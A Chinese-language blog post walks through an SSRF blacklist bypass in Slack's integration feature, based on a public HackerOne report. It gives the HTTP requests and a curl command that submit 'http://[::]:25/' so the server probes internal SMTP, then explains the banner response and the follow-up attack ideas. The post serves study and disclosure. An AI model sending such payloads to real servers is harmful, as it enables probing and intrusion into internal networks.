---
title: ssrf之黑名单绕过
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495669&idx=1&sn=d2d55ebeb81601b095f1ec869fa52c41&chksm=e8a5e596dfd26c808b17d13ee9e04016c95a4e4db071a2943e684c4301aa0fea53518598ebc3&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-09-01
fetch_date: 2025-10-06T18:24:59.462477
---

# ssrf之黑名单绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj656JDrRs6KhwtvtWiasauS37sLH7Muomub4jPWJcxKlqgoJUYro6SWPUXjQK85Ibf4xFoR5d2Ipmw/0?wx_fmt=jpeg)

# ssrf之黑名单绕过

原创

richardo1o1

迪哥讲事

## 正文

### 正常情况

在正常情况下，Slack的集成功能允许用户提交一个合法的外部URL，然后服务器会访问该URL。例如：

```
POST /services/4814366410 HTTP/1.1
Host: agarri.slack.com
...
url=http://example.com/resource

~
```

在这种情况下，服务器会访问http://example.com/resource，这是一个正常的请求行为。

### 受到攻击后的请求（SSRF攻击）

如果攻击者利用了SSRF漏洞，他们可以提交一个恶意的URL，例如使用IPv6格式的地址[::]来绕过黑名单，并访问内部服务：

```
POST /services/4814366410 HTTP/1.1
Host: agarri.slack.com
...
url=http://[::]:25/
```

在这个例子中，Slack的服务器会尝试访问http://[::]:25/，而这个地址实际上指向了攻击者意图访问的内部网络的端口25（通常是SMTP服务）。

## 攻击流程详细解释

### 步骤 1: 发现SSRF漏洞

攻击者首先发现了Slack集成功能中可以提交URL的地方，并且意识到这些URL会由服务器直接访问。同时，攻击者注意到黑名单检查可以通过使用IPv6的特定表示法[::]绕过。

### 步骤 2: 构造恶意请求

攻击者构造了一个恶意的HTTP请求，这个请求中包含了一个绕过黑名单的URL。具体来说，他们使用了[::]表示法来指向内部网络中的服务。例如：

```
POST /services/4814366410 HTTP/1.1
Host: agarri.slack.com
...
url=http://[::]:25/
```

这个URL中的[::]表示本地的IPv6地址，而端口25通常用于SMTP服务，攻击者希望通过这个请求访问内部网络的SMTP服务器。

### 步骤 3: 发送恶意请求

攻击者发送这个构造好的HTTP请求，Slack服务器会尝试访问攻击者指定的内部服务：

```
curl -X POST https://agarri.slack.com/services/4814366410 \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "url=http://[::]:25/"
```

### 步骤 4: 分析响应

服务器访问该URL后会返回响应，攻击者可以通过这个响应判断内部服务的存在。例如，如果SMTP服务在运行，可能会返回类似于220 squid3.tinyspeck.com ESMTP Postfix的响应。攻击者可以进一步分析这个响应以确定内部网络中的服务状态和版本信息。

### 步骤 5: 利用漏洞进行进一步攻击

一旦确认了内部服务的存在，攻击者可能会尝试进一步利用其他已知漏洞进行更深入的攻击，比如尝试通过SMTP服务发送恶意邮件，或者通过其他服务获取更高权限的访问。

这里Slack使用了一个黑名单机制来阻止访问内部网络（如localhost、10.0.0.0/8、192.168.0.0/24等），但这个黑名单可以通过使用“[::]”作为主机名来绕过。这个攻击手法只能影响那些绑定了所有接口并支持IPv6的服务。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 参考

https://hackerone.com/reports/61312

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过